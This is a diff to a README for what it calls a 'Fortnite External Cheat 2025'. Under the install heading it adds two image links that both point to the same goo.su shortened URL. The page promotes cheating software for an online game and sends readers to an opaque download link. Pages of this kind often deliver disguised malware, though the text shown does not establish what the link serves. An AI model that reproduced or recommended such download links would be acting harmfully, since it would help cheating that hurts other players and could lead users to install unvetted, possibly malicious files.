@@ -31,6 +31,21 @@ With features built for both casual and competitive players, this cheat balances
 
 To install the latest version of the Fortnite External Cheat 2025:
 
+<table>
+  <tr>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/T72Ouhk.jpeg" alt="fortnite hack" width="250">
+      </a>
+    </td>
+    <td align="center">
+      <a href="https://goo.su/xBUsR">
+        <img src="https://i.imgur.com/z6NnWRw.jpeg" alt="another hack" width="250">
+      </a>
+    </td>
+  </tr>
+</table>
+
 
 ### Steps:
 
